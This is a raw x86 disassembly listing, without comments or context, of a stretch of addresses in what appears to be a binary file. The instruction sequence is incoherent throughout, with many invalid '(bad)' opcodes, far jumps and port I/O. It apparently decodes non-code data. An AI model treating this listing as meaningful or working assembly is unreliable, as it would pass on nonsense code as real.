  41ffa8:	shl    DWORD PTR ds:0xbbcca3a1,0xe6
  41ffaf:	push   esi
  41ffb0:	dec    ecx
  41ffb1:	jns    0x41ff3a
  41ffb3:	xor    BYTE PTR [edi+0x79],ah
  41ffb6:	sub    ch,BYTE PTR [ebx+edx*2-0x1e]
  41ffba:	cli    
  41ffbb:	loop   0x420021
  41ffbd:	or     eax,0x9789f5ee
  41ffc2:	add    BYTE PTR [eax+0x1e],dl
  41ffc5:	mov    cl,0x41
  41ffc7:	test   DWORD PTR [ebp-0x1e],edx
  41ffca:	push   ecx
  41ffcb:	mov    ebx,0xcb6f1d82
  41ffd0:	push   ebp
  41ffd1:	ins    DWORD PTR es:[edi],dx
  41ffd2:	adc    BYTE PTR [eax+0xc2e2c3a],bh
  41ffd8:	cmp    BYTE PTR [edi+0x508ba0c1],0x4f
  41ffdf:	adc    al,0x99
  41ffe1:	rol    DWORD PTR [ebx-0x434c8c9d],1
  41ffe7:	test   al,0x8b
  41ffe9:	mov    esi,0x5f5618f1
  41ffee:	out    0x30,al
  41fff0:	jb     0x41ffc5
  41fff2:	lea    ebx,[eax+0x5d6cebe8]
  41fff8:	push   esp
  41fff9:	xor    eax,0x90cc8b4
  41fffe:	into   
  41ffff:	pop    ecx
  420000:	or     ebx,DWORD PTR [esi-0x2f750dd5]
  420006:	test   edx,ecx
  420008:	jmp    0x950182e4
  42000d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42000e:	gs int 0xae
  420011:	lea    esp,[ebx]
  420013:	std    
  420014:	cmp    eax,0x6be1e44b
  420019:	inc    ebx
  42001a:	push   edi
  42001b:	pop    ebp
  42001c:	jp     0x41fff5
  42001e:	mov    eax,0x61c85af6
  420023:	jmp    0x3675:0xb684203c
  42002a:	pop    ds
  42002b:	mov    cl,0x39
  42002d:	hlt    
  42002e:	jae    0x42006f
  420030:	sub    ah,bh
  420032:	scas   eax,DWORD PTR es:[edi]
  420033:	cmp    ecx,0xffffffbe
  420036:	pop    esi
  420037:	rcr    BYTE PTR ds:0x3d0f3729,0xe6
  42003e:	into   
  42003f:	mov    ecx,0x9375f8e2
  420044:	or     al,0xbf
  420046:	adc    ah,BYTE PTR cs:[ebp+edi*8-0x34]
  42004b:	jae    0x41ffd0
  42004d:	or     DWORD PTR gs:[edx-0x61],edi
  420051:	rol    DWORD PTR [edi],0x21
  420054:	push   ecx
  420055:	xchg   DWORD PTR ds:0x7cb8e767,edx
  42005b:	neg    BYTE PTR [ebx]
  42005d:	mov    bl,BYTE PTR [eax-0x35ccf8f0]
  420063:	fdiv   DWORD PTR [eax+eiz*1]
  420066:	xor    ch,BYTE PTR [ecx+0x6d]
  420069:	fbstp  TBYTE PTR [esi]
  42006b:	push   esp
  42006c:	push   ss
  42006d:	js     0x42001f
  42006f:	mov    esp,0x3c73e527
  420074:	and    DWORD PTR [esi],edi
  420076:	sahf   
  420077:	test   al,0x6
  420079:	push   0x22
  42007b:	ret    0x34fe
  42007e:	pushf  
  42007f:	xchg   ebx,eax
  420080:	inc    esi
  420081:	mov    bl,0x5a
  420083:	out    0x33,eax
  420085:	(bad)  
  420086:	std    
  420087:	inc    esp
  420088:	jmp    0x103c455
  42008d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42008e:	fwait
  42008f:	or     esp,edi
  420091:	popa   
  420092:	bnd ret 0x2fde
  420096:	sahf   
  420097:	lods   al,BYTE PTR ds:[esi]
  420098:	out    0xdd,al
  42009a:	jo     0x4200e6
  42009c:	pop    es
  42009d:	ss shl esp,1
  4200a0:	mov    eax,ds:0x66e6eb5b
  4200a5:	lods   eax,DWORD PTR ds:[esi]
  4200a6:	repnz or eax,0x5b05e2ef
  4200ac:	push   edx
  4200ad:	adc    DWORD PTR [esi+0x56],0xffffffc7
  4200b1:	or     ch,BYTE PTR [ecx-0x517dcad]
  4200b7:	cwde   
  4200b8:	aas    
  4200b9:	ins    BYTE PTR es:[edi],dx
  4200ba:	cmc    
  4200bb:	adc    al,0x87
  4200bd:	jmp    0x8e0d:0x5cffd781
  4200c4:	pushf  
  4200c5:	xchg   esp,eax
  4200c6:	dec    WORD PTR [edi-0xe]
  4200ca:	outs   dx,DWORD PTR ds:[esi]
  4200cb:	xchg   edi,eax
  4200cc:	mov    dh,0xfa
  4200ce:	and    cl,bh
  4200d0:	sub    DWORD PTR [esi-0x22097407],esi
  4200d6:	and    al,0x9
  4200d8:	inc    edi
  4200d9:	mov    edx,0x43b8ab3d
  4200de:	add    esi,eax
  4200e0:	mov    ds:0xd2e91824,al
  4200e5:	mov    ss,WORD PTR [ebp-0x45]
  4200e8:	(bad)  
  4200ea:	test   BYTE PTR ds:0xff8819e9,dl
  4200f0:	mov    dh,0xaa
  4200f2:	jno    0x4200c9
  4200f4:	pop    edx
  4200f5:	scas   al,BYTE PTR es:[edi]
  4200f6:	adc    eax,DWORD PTR [ecx+0x2b5f0cf8]
  4200fc:	sbb    ch,BYTE PTR [ecx]
  4200fe:	adc    dh,BYTE PTR [ebx-0x2e69cfa3]
  420104:	rol    BYTE PTR ds:0xf116449f,1
  42010a:	xchg   ebp,eax
  42010b:	call   0xa55a:0x474b75b8
  420112:	fidivr DWORD PTR [ebx+0x48]
  420115:	push   esi
  420116:	pop    ebx
  420117:	ret    0xb9a7
  42011a:	test   al,0x1c
  42011c:	jb     0x42010b
  42011e:	xchg   ebx,eax
  42011f:	cmp    BYTE PTR [edx+0x6b],bl
  420122:	lock xchg edx,eax
  420124:	popa   
  420125:	imul   eax,ebx,0xffffffab
  420128:	adc    esi,DWORD PTR [edi+ecx*2-0x4c]
  42012c:	fdivr  DWORD PTR [edi+0x42a57941]
  420132:	enter  0x4b1d,0x52
  420136:	cs ret 
  420138:	aaa    
  420139:	xor    dl,BYTE PTR [ebp+0x27c0a489]
  42013f:	xor    dh,BYTE PTR [ebx]
  420141:	ja     0x4201aa
  420143:	stos   BYTE PTR es:[edi],al
  420144:	and    eax,0xde2f436b
  420149:	push   ds
  42014a:	xchg   DWORD PTR [esi+0x1197a35f],ecx
  420150:	inc    ebx
  420151:	loope  0x42016b
  420153:	je     0x4201c2
  420155:	inc    ecx
  420156:	dec    ebp
  420157:	cmp    eax,0x4a3c3974
  42015c:	sbb    eax,0xa00baf7a
  420161:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420162:	pusha  
  420163:	icebp  
  420164:	imul   edi,DWORD PTR [edx],0x42c20130
  42016a:	imul   edx,DWORD PTR [ecx-0x3ba30e81],0xfb6a044b
  420174:	push   esi
  420175:	fmul   QWORD PTR [ebx+0x50]
  420178:	sbb    bh,BYTE PTR [ecx+0x659430b8]
  42017e:	frstor [ecx-0x41eebd81]
  420184:	lahf   
  420185:	shl    BYTE PTR [esi-0x43],cl
  420188:	cmp    al,0x9e
  42018a:	add    esp,DWORD PTR ss:[esi+0x58e6be34]
  420191:	jecxz  0x42020d
  420193:	outs   dx,BYTE PTR ds:[esi]
  420194:	inc    esp
  420195:	or     al,0x7a
  420197:	cld    
  420198:	xchg   edx,eax
  420199:	mov    es,WORD PTR [edx+eax*1-0x76]
  42019d:	mov    dl,0xfa
  42019f:	sub    eax,0xaa57a90b
  4201a4:	daa    
  4201a5:	sbb    BYTE PTR [ebx+0x526a412a],dh
  4201ab:	or     ch,BYTE PTR [edi-0x627d4225]
  4201b1:	mov    ah,0xd3
  4201b3:	or     eax,0xc382cc33
  4201b8:	and    BYTE PTR [eax+0x65],dl
  4201bb:	cld    
  4201bc:	mov    edx,0xf3b4d7b2
  4201c1:	or     BYTE PTR [edi],bl
  4201c3:	lahf   
  4201c4:	mov    eax,0x8bd91d8a
  4201c9:	cmp    BYTE PTR ss:[ecx-0x62],al
  4201cd:	rcl    DWORD PTR [ebx-0x47],0x44
  4201d1:	and    ebp,ebx
  4201d3:	ss xor eax,0x85898e19
  4201d9:	xor    DWORD PTR [ebx-0x36],eax
  4201dc:	scas   al,BYTE PTR es:[edi]
  4201dd:	ins    DWORD PTR es:[edi],dx
  4201de:	inc    esp
  4201df:	dec    ebx
  4201e0:	loope  0x42020d
  4201e2:	imul   ebx,ebx,0xa61eecb6
  4201e8:	shr    DWORD PTR [eax],cl
  4201ea:	daa    
  4201eb:	sbb    bh,ah
  4201ed:	rcr    ebp,0x4b
  4201f0:	or     eax,0x113e04d2
  4201f5:	add    BYTE PTR [esi-0x258bdca8],ah
  4201fb:	arpl   WORD PTR [esi-0xf93db6b],cx
  420201:	xor    eax,0x59de222a
  420206:	test   DWORD PTR [edi],esi
  420208:	mov    ds:0x39fb5de,eax
  42020d:	dec    edx
  42020e:	retf   0xf526
  420211:	cmc    
  420212:	inc    edi
  420213:	dec    ecx
  420214:	repnz or eax,0x77595a80
  42021a:	sub    eax,0x5a532795
  42021f:	daa    
  420220:	into   
  420221:	fnstsw WORD PTR [edx-0x3d]
  420224:	xchg   edi,eax
  420225:	sub    ah,bh
  420227:	es mov edx,0x67afecbb
  42022d:	aad    0x85
  42022f:	addr16 retf 
  420231:	inc    ecx
  420232:	pop    ds
  420233:	xor    dl,ch
  420235:	stos   DWORD PTR es:[edi],eax
  420236:	dec    esi
  420237:	gs jo  0x420248
  42023a:	xchg   edi,eax
  42023b:	inc    esi
  42023c:	adc    eax,0x24b2edc1
  420241:	outs   dx,DWORD PTR ds:[esi]
  420242:	paddb  mm1,QWORD PTR [esp+eiz*4-0x4]
  420247:	push   es
  420248:	scas   al,BYTE PTR es:[edi]
  420249:	iret   
  42024a:	add    eax,0xd7db379d
  42024f:	imul   ecx,DWORD PTR [edx],0x338b17bc
  420255:	fld1   
  420257:	lods   al,BYTE PTR ds:[esi]
  420258:	add    BYTE PTR [ebx+esi*8],ah
  42025b:	loopne 0x4201e6
  42025d:	hlt    
  42025e:	adc    BYTE PTR [ecx],dh
  420260:	arpl   WORD PTR [ecx+esi*2-0x545afd82],si
  420267:	pop    ebx
  420268:	fstp   QWORD PTR [esi+0x3ac5b269]
  42026e:	out    dx,eax
  42026f:	pop    esp
  420270:	dec    esi
  420271:	sar    BYTE PTR [ebp+0x3d9859c2],cl
  420277:	inc    ebp
  420278:	ins    BYTE PTR es:[edi],dx
  420279:	fadd   st(4),st
  42027b:	div    BYTE PTR [ebx-0x11e68837]
  420281:	inc    eax
  420282:	sbb    al,0x4e
  420284:	cmc    
  420285:	pop    esp
  420286:	cmp    ah,dl
  420288:	data16 jb 0x420237
  42028b:	xchg   BYTE PTR gs:[edi+0x6cfffd7c],ch
  420292:	inc    esp
  420293:	sti    
  420294:	(bad)  
  420295:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420296:	in     eax,0x44
  420298:	pop    edx
  420299:	and    BYTE PTR [ecx-0x8674541],bl
  42029f:	inc    ecx
  4202a0:	inc    ebp
  4202a1:	int    0xb2
  4202a3:	push   ss
  4202a4:	and    BYTE PTR [ecx-0x64e0a387],dl
  4202aa:	arpl   WORD PTR [esi],di
  4202ac:	cdq    
  4202ad:	mov    ds:0x56f9cdd2,eax
  4202b2:	inc    ebp
  4202b3:	sub    bh,dh
  4202b5:	dec    esi
  4202b6:	test   al,0x17
  4202b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202b9:	mov    ds:0x2eb6863d,al
  4202be:	add    bh,BYTE PTR [esi]
  4202c0:	or     cl,BYTE PTR [ebx+0x6f6f98ab]
  4202c6:	lods   al,BYTE PTR ds:[esi]
  4202c7:	ret    
  4202c8:	repnz mov WORD PTR [ebx+0x1bc4d51e],?
  4202cf:	push   ebp
  4202d0:	lock mov bh,0xbe
  4202d3:	mov    al,ds:0xe608c178
  4202d8:	jae    0x4202c2
  4202da:	cwde   
  4202db:	fmul   QWORD PTR [esi+eiz*8]
  4202de:	dec    eax
  4202df:	ficomp WORD PTR [esi]
  4202e1:	inc    ebp
  4202e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4202e3:	push   esp
  4202e4:	add    BYTE PTR [eax],bl
  4202e6:	add    BYTE PTR [eax],al
  4202e8:	jo     0x420291
  4202ea:	xor    BYTE PTR [ecx+0x77],dh
  4202ed:	and    esi,DWORD PTR [edx]
  4202ef:	sub    al,0x76
  4202f1:	pop    ss
  4202f2:	sahf   
  4202f3:	iret   
  4202f4:	stos   BYTE PTR es:[edi],al
  4202f5:	or     BYTE PTR [ecx],0x4c
  4202f8:	mov    DWORD PTR [ecx+0x27],ecx
  4202fb:	mov    ah,0x41
  4202fd:	icebp  
  4202fe:	or     al,0xf4
  420300:	or     eax,0x7e1739e1
  420305:	adc    BYTE PTR [edi+0xa17d387],0xf5
  42030c:	push   ebp
  42030d:	add    ebp,DWORD PTR [eax+0x2e632daa]
  420313:	popf   
  420314:	adc    eax,0xaa16a0fa
  420319:	xchg   ebx,eax
  42031a:	shl    BYTE PTR [esi+0x2ec59d38],0xb8
  420321:	adc    al,0x61
  420323:	mul    DWORD PTR [esp+ebx*2+0x53]
  420327:	bound  edx,QWORD PTR es:[esi-0x77cb3a11]
  42032e:	lds    edx,FWORD PTR [edx]
  420330:	cmp    DWORD PTR [ebx],esi
  420332:	sub    eax,0x3b448f49
  420337:	nop
  420338:	cmp    BYTE PTR [esi],dl
  42033a:	push   es
  42033b:	xchg   esp,eax
  42033c:	push   cs
  42033d:	retf   0xabc1
  420340:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420341:	mov    al,BYTE PTR [ecx]
  420343:	mov    bh,0x5f
  420345:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420346:	mov    ebp,0x9ef69a26
  42034b:	dec    eax
  42034c:	scas   al,BYTE PTR es:[edi]
  42034d:	mov    cl,0xf6
  42034f:	out    dx,al
  420350:	int3   
  420351:	rol    DWORD PTR [ebx+ecx*4],1
  420354:	lock xchg ebp,eax
  420356:	mov    bh,0x13
  420358:	mov    bl,0x8b
  42035a:	scas   eax,DWORD PTR es:[edi]
  42035b:	mov    edx,0xc7bb3f8a
  420360:	sub    cl,BYTE PTR [edi+0x4d]
  420363:	mov    ds:0x730587f2,al
  420368:	jle    0x42031f
  42036a:	loope  0x4203b2
  42036c:	cmp    al,0xc1
  42036e:	add    BYTE PTR [edx+0x67615a10],0xae
  420375:	mov    cl,0x54
  420377:	ss in  al,dx
  420379:	pop    esp
  42037a:	or     BYTE PTR [esi],cl
  42037c:	and    eax,DWORD PTR [ecx]
  42037e:	mov    esi,0xe07ba626
  420383:	lds    ebp,FWORD PTR [esi-0x2f]
  420386:	xchg   ecx,eax
  420387:	mov    eax,0x7e1b8cc9
  42038c:	cmc    
  42038d:	repnz inc esp
  42038f:	push   eax
  420390:	dec    ebx
  420391:	add    dh,BYTE PTR [edx]
  420393:	js     0x420332
  420395:	daa    
  420396:	(bad)  
  420397:	push   edx
  420398:	and    BYTE PTR [edx+0x48ee882c],ch
  42039e:	int3   
  42039f:	xchg   esi,eax
  4203a0:	inc    ebp
  4203a1:	push   edi
  4203a2:	or     cl,BYTE PTR [eax+eax*4]
  4203a5:	aad    0x3c
  4203a7:	stos   BYTE PTR es:[edi],al
  4203a8:	cs jae 0x4203b7
  4203ab:	fbstp  TBYTE PTR [eax]
  4203ad:	sub    eax,ebp
  4203af:	push   esp
  4203b0:	jno    0x4203a2
  4203b2:	(bad)  
  4203b3:	mov    WORD PTR [eax-0x44],fs
  4203b6:	ins    DWORD PTR es:[edi],dx
  4203b7:	push   ss
  4203b8:	jns    0x4203d8
  4203ba:	dec    edi
  4203bb:	icebp  
  4203bc:	or     al,0xb0
  4203be:	and    dh,BYTE PTR [ecx-0x35]
  4203c1:	and    al,0x50
  4203c3:	add    eax,0x8f44ca23
  4203c8:	and    BYTE PTR [ecx+0x44],cl
  4203cb:	out    dx,eax
  4203cc:	out    dx,al
  4203cd:	mov    ch,0x4d
  4203cf:	pop    es
  4203d0:	mov    dl,0xcd
  4203d2:	inc    edx
  4203d3:	sbb    ah,BYTE PTR [esi-0x51afbfe6]
  4203d9:	gs jp  0x420394
  4203dc:	out    0xac,eax
  4203de:	es loopne 0x4203d0
  4203e1:	into   
  4203e2:	lds    edx,FWORD PTR [esi-0x15e46ce]
  4203e8:	jg     0x4203dc
  4203ea:	mov    ah,BYTE PTR [edi-0x33]
  4203ed:	shl    DWORD PTR [ebp-0x1a],0x47
  4203f1:	bound  esp,QWORD PTR [edi+eax*8]
  4203f4:	xchg   esp,eax
  4203f6:	mov    eax,0xd746b249
  4203fb:	(bad)  
  4203fc:	cmp    ch,BYTE PTR [edx-0x61]
  4203ff:	jge    0x4203d5
  420401:	mov    ecx,0x46c1f92d
  420406:	cmp    DWORD PTR [edi-0x2a5e6133],0xe2f177f4
  420410:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420411:	arpl   cx,cx
  420413:	nop
  420414:	mov    dh,BYTE PTR ds:0x5120bcc2
  42041a:	adc    DWORD PTR [eax+edx*2],ebp
  42041d:	sub    BYTE PTR [edi],0x3b
  420420:	fsub   QWORD PTR [esi-0x5d]
  420423:	outs   dx,BYTE PTR ds:[esi]
  420424:	push   ecx
  420425:	jo     0x4203d5
  420427:	pushf  
  420428:	pusha  
  420429:	and    DWORD PTR [esi+ebx*1-0x7a8f7de2],esi
  420430:	sbb    BYTE PTR [eax],ah
  420432:	jecxz  0x420428
  420434:	adc    eax,0x4792b419
  420439:	cs jmp 0x9d70bba7
  42043f:	imul   eax,DWORD PTR [eax+0x36],0xffffffd8
  420443:	xor    BYTE PTR [edi+ebp*4+0x68],bl
  420447:	repz test al,0xd5
  42044a:	xchg   esi,eax
  42044b:	fcomp  QWORD PTR [ebp-0x5a]
  42044e:	adc    eax,0xbbc44750
  420453:	jno    0x4203e5
  420455:	fiadd  WORD PTR [edi-0x7066d6fa]
  42045b:	not    BYTE PTR [edi*2-0x3f3cce5]
  420462:	fcmovnu st,st(0)
  420464:	push   cs
  420465:	(bad)  
  420466:	enter  0xe97b,0xc2
  42046a:	mov    ah,0x93
  42046c:	(bad)  
  42046d:	fiadd  DWORD PTR [ecx]
  42046f:	inc    edi
  420470:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420471:	jp     0x420406
  420473:	mov    BYTE PTR [esi],al
  420475:	pop    ebp
  420476:	jnp    0x420491
  420478:	lods   al,BYTE PTR ds:[esi]
  420479:	scas   al,BYTE PTR es:[edi]
  42047a:	push   ebx
  42047b:	adc    eax,0x4e3ead35
  420480:	test   DWORD PTR [edx+0x32],ebp
  420483:	xchg   esi,eax
  420484:	ds dec edx
  420486:	leave  
  420487:	ins    DWORD PTR es:[edi],dx
  420488:	jo     0x420443
  42048a:	repz adc bh,BYTE PTR [ecx+esi*2+0x2e]
  42048f:	in     al,0x72
  420491:	stc    
  420492:	out    0x9d,eax
  420494:	pop    ebp
  420495:	xchg   edi,eax
  420496:	mov    edi,0x7ceb8419
  42049b:	push   0x2a558fd7
  4204a0:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  4204a2:	cmp    edi,DWORD PTR ds:[eax-0x67b2b2ee]
  4204a9:	sub    ecx,DWORD PTR [edx-0x79]
  4204ac:	pushf  
  4204ad:	cmp    edi,DWORD PTR [eax-0x1b]
  4204b0:	cdq    
  4204b1:	pushf  
  4204b2:	(bad)  
  4204b4:	in     eax,dx
  4204b5:	sar    DWORD PTR [eax-0x66],cl
  4204b8:	scas   al,BYTE PTR es:[edi]
  4204b9:	aam    0x74
  4204bb:	push   0xffffffc9
  4204bd:	cmp    edi,edx
  4204bf:	pop    ds
  4204c0:	push   ds
  4204c1:	in     al,0xa3
  4204c3:	and    dl,BYTE PTR [edi]
  4204c5:	mov    ch,0xab
  4204c7:	fstp   TBYTE PTR [ebp+0x5d]
  4204ca:	(bad)
  4204cd:	aaa    
  4204ce:	add    DWORD PTR [edx+0x3b89fd1a],ebx
  4204d4:	dec    BYTE PTR fs:0xcbab1246
  4204db:	lods   al,BYTE PTR ds:[esi]
  4204dc:	xor    eax,0xa8b499b6
  4204e1:	push   DWORD PTR [ecx-0x6c]
  4204e4:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4204e6:	and    DWORD PTR [edx],esp
  4204e8:	jbe    0x4204c5
  4204ea:	and    ecx,DWORD PTR [esi]
  4204ec:	adc    al,0xb4
  4204ee:	push   ds
  4204ef:	sbb    esi,ebp
  4204f1:	add    eax,0xeffa35d7
  4204f6:	and    DWORD PTR [esi+ebp*8+0x3387256a],ebp
  4204fd:	(bad)  
  4204fe:	dec    ebx
  4204ff:	(bad)  
  420500:	int    0xf9
  420502:	mov    eax,0x96910797
  420507:	adc    BYTE PTR [eax],0x89
  42050a:	cmp    DWORD PTR [ecx-0x39],edx
  42050d:	int    0x53
  42050f:	cmp    DWORD PTR [ebx],ecx
  420511:	and    eax,0xa602a35a
  420516:	add    DWORD PTR [edi],ebp
  420518:	movzx  ebp,WORD PTR [ebx+eiz*2+0x373fc138]
  420520:	pop    es
  420521:	ja     0x420509
  420523:	mov    ds:0x27a00e54,eax
  420528:	jg     0x420552
  42052a:	dec    eax
  42052b:	arpl   WORD PTR [esi+0x79],dx
  42052e:	adc    esi,DWORD PTR [edi]
  420530:	jmp    0x1c3348de
  420535:	shl    DWORD PTR [esi*4+0x66c5d1d2],1
  42053c:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  42053e:	imul   ebp,esp,0x5df3d5a
  420544:	mov    bh,BYTE PTR [esi-0x77]
  420547:	js     0x42056a
  420549:	pop    ss
  42054a:	fdiv   st,st(3)
  42054c:	shl    DWORD PTR [edi],cl
  42054e:	cmp    esi,DWORD PTR [edi]
  420550:	mov    eax,ds:0x63688e2a
  420555:	stc    
  420556:	xchg   edi,eax
  420557:	es push cs
  420559:	popf   
  42055a:	xor    DWORD PTR [edi],esp
  42055c:	add    DWORD PTR ds:0x702ba57c,ebx
  420562:	or     al,0x7f
  420564:	mov    ebx,esp
  420566:	adc    eax,0xabbb6eb5
  42056b:	hlt    
  42056c:	cdq    
  42056d:	out    0x97,al
  42056f:	pop    ecx
  420570:	mov    ebx,0x4601417a
  420575:	lock not BYTE PTR [edx-0x53dcf114]
  42057c:	jmp    0x8550:0x5d7662fe
  420583:	add    bl,al
  420585:	jge    0x420572
  420587:	adc    eax,0x2b77a05a
  42058c:	and    eax,DWORD PTR ds:0xaf6610cd
  420592:	out    0x8d,al
  420594:	scas   eax,DWORD PTR es:[edi]
  420595:	iret   
  420596:	arpl   cx,sp
  420598:	xchg   ecx,eax
  420599:	xor    BYTE PTR [edx+0x568c1bba],ah
  42059f:	popf   
  4205a0:	add    al,0x31
  4205a2:	sub    esi,0xd6acf35f
  4205a8:	adc    al,BYTE PTR [bx+si]
  4205ab:	adc    DWORD PTR [ebx+0x32],ecx
  4205ae:	popf   
  4205af:	sbb    al,0xb5
  4205b1:	or     BYTE PTR [esi+0x11ffdbbf],ch
  4205b7:	sub    eax,edx
  4205b9:	fsubp  st(3),st
  4205bb:	xor    eax,0x44d4e622
  4205c0:	test   ecx,0xe80f84c6
  4205c6:	inc    ebp
  4205c7:	and    bl,BYTE PTR [edi]
  4205c9:	pop    esi
  4205ca:	(bad)  
  4205cb:	into   
  4205cc:	inc    BYTE PTR [esi-0x74]
  4205cf:	lea    ebp,[ecx-0x68788f8b]
  4205d5:	inc    ebp
  4205d6:	stos   BYTE PTR es:[edi],al
  4205d7:	loopne 0x420576
  4205d9:	sbb    al,0xed
  4205db:	fs push eax
  4205dd:	outs   dx,BYTE PTR ds:[esi]
  4205de:	dec    ebp
  4205df:	jae    0x4205bf
  4205e1:	push   es
  4205e2:	sub    esp,edx
  4205e4:	inc    esi
  4205e5:	retf   0xc72
  4205e8:	(bad)  
  4205ea:	inc    esi
  4205eb:	gs dec esp
  4205ed:	jne    0x42065e
  4205ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4205f0:	mov    cs,edx
  4205f2:	inc    esi
  4205f3:	pop    ecx
  4205f4:	fs nop
  4205f6:	or     BYTE PTR [ebx-0x1496e242],dh
  4205fc:	xchg   edi,eax
  4205fd:	mov    ch,0xf3
  4205ff:	call   0xd83b:0x841fface
  420606:	jmp    0xfb7b:0xf77aea28
  42060d:	adc    ah,BYTE PTR [ecx+edi*8+0x43]
  420611:	mov    WORD PTR [eax-0x3a00bdc2],es
  420617:	xor    al,0x61
  420619:	div    DWORD PTR [ebx+ebp*2-0x6159b477]
  420620:	cdq    
  420621:	sti    
  420622:	xor    edx,esi
  420624:	loop   0x4205e8
  420626:	bnd jg 0x4205ed
  420629:	clc    
  42062a:	jmp    0xb7cf:0xb13ec605
  420631:	mov    esi,0x5283f8df
  420636:	fist   WORD PTR [ecx]
  420638:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420639:	nop
  42063a:	out    0xd5,al
  42063c:	jp     0x42064c
  42063e:	mov    BYTE PTR [esi-0x6d6eda9c],al
  420644:	pop    ebx
  420645:	xchg   BYTE PTR [ecx],bl
  420647:	xor    al,0x80
  420649:	out    dx,eax
  42064a:	retf   0xfa1f
  42064d:	mov    esi,0x2f480b3a
  420652:	adc    eax,0x82608836
  420657:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420658:	or     DWORD PTR [ebp-0x7b126a01],edx
  42065e:	pop    ss
  42065f:	sbb    BYTE PTR [esi+0x56],dh
  420662:	sbb    eax,0xb3640104
  420667:	(bad)  
  420669:	rol    BYTE PTR [ecx-0x9],0xc4
  42066d:	fisubr DWORD PTR [eax]
  42066f:	jnp    0x420654
  420671:	stc    
  420672:	cmp    ebx,DWORD PTR [edx-0x2ed1022b]
  420678:	xlat   BYTE PTR es:[ebx]
  42067a:	jae    0x420604
  42067c:	inc    eax
  42067d:	sub    ebx,0x7e619f64
  420683:	loop   0x4206b1
  420685:	or     eax,0xb52cc403
  42068a:	not    al
  42068c:	(bad)  
  42068d:	std    
  42068e:	enter  0x89a4,0x5b
  420692:	jbe    0x4206b6
  420694:	in     al,dx
  420695:	and    BYTE PTR [edx],0x2c
  420698:	cmp    al,0xa2
  42069a:	stos   DWORD PTR es:[edi],eax
  42069b:	daa    
  42069c:	scas   al,BYTE PTR es:[edi]
  42069d:	or     eax,0x4d747f40
  4206a2:	retf   
  4206a3:	ins    DWORD PTR es:[edi],dx
  4206a4:	sahf   
  4206a5:	xchg   esi,eax
  4206a6:	and    BYTE PTR [eax-0x65],ch
  4206a9:	loopne 0x4206a3
  4206ab:	and    ah,BYTE PTR [edi-0x50f0a0a]
  4206b1:	add    dh,al
  4206b3:	leave  
  4206b4:	loope  0x42063a
  4206b6:	pop    edi
  4206b7:	out    0x27,al
  4206b9:	fsub   DWORD PTR [eax+0x1b]
  4206bc:	jecxz  0x420735
  4206be:	scas   al,BYTE PTR es:[edi]
  4206bf:	stc    
  4206c0:	(bad)  
  4206c2:	cdq    
  4206c3:	jae    0x4206bd
  4206c5:	aaa    
  4206c6:	xchg   DWORD PTR [eax+0x2c],ebp
  4206c9:	div    BYTE PTR [edi+ebx*8-0x3a4a8a90]
  4206d0:	stos   BYTE PTR es:[edi],al
  4206d1:	out    0x2d,al
  4206d3:	cmp    al,0x8b
  4206d5:	fwait
  4206d6:	jo     0x4206db
  4206d8:	fldlg2 
  4206da:	fld    DWORD PTR [esi-0x60bc075c]
  4206e0:	ins    BYTE PTR es:[edi],dx
  4206e1:	(bad)  
  4206e2:	mov    edi,0x7b47d80f
  4206e7:	jle    0x420749
  4206e9:	mov    ?,WORD PTR [edi+0x35]
  4206ec:	daa    
  4206ed:	sub    eax,0x8975e438
  4206f2:	jecxz  0x420690
  4206f4:	xor    BYTE PTR [ecx],0x70
  4206f7:	dec    eax
  4206f8:	jne    0x4206b4
  4206fa:	and    ah,BYTE PTR [eax-0x6]
  4206fd:	(bad)
  420700:	push   ebp
  420701:	push   eax
  420702:	into   
  420703:	iret   
  420704:	push   es
  420705:	ret    
  420706:	aaa    
  420707:	dec    ebp
  420708:	out    0x63,al
  42070a:	daa    
  42070b:	repz fwait
  42070d:	push   cs
  42070e:	loopne 0x420776
  420710:	xor    edi,DWORD PTR [edi+0x16]
  420713:	das    
  420714:	daa    
  420715:	sub    al,0xc6
  420717:	add    bh,BYTE PTR [eax-0x25a8f937]
  42071d:	in     al,dx
  42071e:	fcmovnu st,st(5)
  420720:	(bad)  
  420721:	je     0x4206c1
  420723:	repz scas eax,DWORD PTR es:[edi]
  420725:	pop    edi
  420726:	shl    edi,0xc7
  420729:	ror    DWORD PTR [eax+ecx*2+0x60],0xb4
  42072e:	in     eax,0x70
  420730:	mov    dh,0x51
  420732:	call   0x7f285c5f
  420737:	mov    bl,0xd9
  420739:	add    DWORD PTR [edi+ebp*4],ecx
  42073c:	in     eax,0xee
  42073e:	mov    WORD PTR [edx+eiz*8],?
  420741:	and    al,0xc0
  420743:	in     eax,dx
  420744:	jge    0x420714
  420746:	into   
  420747:	sbb    ch,BYTE PTR [esi+0x17]
  42074a:	jmp    0x29a1:0x63f80b38
  420751:	outs   dx,DWORD PTR ds:[esi]
  420752:	(bad)  
  420753:	stc    
  420754:	loopne 0x42072c
  420756:	and    al,0x5c
  420758:	mov    es,eax
  42075a:	ds (bad) 
  42075c:	adc    eax,0x9b1e3fae
  420761:	imul   eax,DWORD PTR [edx-0x58acb77d],0xffffff84
  420768:	sub    eax,0x95a51d42
  42076d:	sbb    eax,0x69641bd4
  420772:	mov    esi,db6
  420775:	int3   
  420776:	mov    esp,0x44a058dd
  42077b:	stos   BYTE PTR es:[edi],al
  42077c:	sbb    eax,0x72ad2f1
  420781:	mov    ecx,0x3af706da
  420786:	jnp    0x42070f
  420788:	enter  0xa597,0x82
  42078c:	jg     0x42073d
  42078e:	imul   esi,DWORD PTR [edx+edi*8]
  420792:	xchg   esi,eax
